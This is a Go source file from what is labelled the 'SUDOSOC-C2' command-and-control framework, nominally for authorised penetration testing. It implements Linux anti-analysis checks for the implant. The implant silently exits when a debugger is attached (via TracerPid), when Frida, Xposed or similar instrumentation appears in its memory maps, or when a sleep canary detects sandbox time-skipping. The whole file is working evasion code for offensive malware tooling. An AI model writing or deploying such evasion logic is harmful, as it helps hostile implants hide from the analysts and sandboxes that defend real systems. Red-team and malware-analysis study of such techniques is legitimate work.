//go:build linux && !android

package limits

/*
	SUDOSOC-C2 Framework — Linux Platform Limits
	Copyright (C) 2026  sudosoc — Seif

	Authorized penetration testing use only.
*/

import (
	"bufio"
	"os"
	"strings"
	"time"
)

func isDomainJoined() (bool, error) {
	return false, nil
}

// PlatformLimits — Linux-specific anti-analysis checks.
// Called by limits.go ExecLimits() in non-debug builds.
func PlatformLimits() {
	// ── 1. Debugger / tracer via TracerPid ────────────────────────────────
	if tracerPidDetected() {
		time.Sleep(3 * time.Second)
		os.Exit(0)
	}

	// ── 2. Frida / dynamic instrumentation in memory maps ────────────────
	if instrumentationInMaps() {
		time.Sleep(5 * time.Second)
		os.Exit(0)
	}

	// ── 3. Sleep canary — detect sandbox time-skipping ───────────────────
	start := time.Now()
	time.Sleep(800 * time.Millisecond)
	if time.Since(start) < 500*time.Millisecond {
		os.Exit(0)
	}
}

// tracerPidDetected reads /proc/self/status looking for a non-zero TracerPid.
func tracerPidDetected() bool {
	f, err := os.Open("/proc/self/status")
	if err != nil {
		return false
	}
	defer f.Close()
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		line := sc.Text()
		if !strings.HasPrefix(line, "TracerPid:") {
			continue
		}
		fields := strings.Fields(line)
		return len(fields) >= 2 && fields[1] != "0"
	}
	return false
}

// instrumentationInMaps checks /proc/self/maps for Frida, Xposed, and
// other runtime instrumentation frameworks.
func instrumentationInMaps() bool {
	data, err := os.ReadFile("/proc/self/maps")
	if err != nil {
		return false
	}
	low := strings.ToLower(string(data))
	for _, sig := range []string{"frida", "xposed", "substrate", "lsposed", "gadget"} {
		if strings.Contains(low, sig) {
			return true
		}
	}
	return false
}
